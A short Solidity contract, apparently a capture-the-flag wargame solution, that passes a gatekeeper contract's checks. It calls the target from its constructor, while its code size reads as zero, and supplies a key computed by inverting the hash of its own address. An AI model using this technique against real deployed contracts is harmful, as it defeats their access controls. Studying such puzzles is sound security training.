// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface G2 {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract ExploitG2 {

    
    
    constructor() {
        //extcode size equals 0 when the contract is initializing. So it will be 0 if we call the target contract
        //from within the constructor
        
        address target = 0x5ECCAd8370901630d10c45a2893c1C797ffcd617;
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        target.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}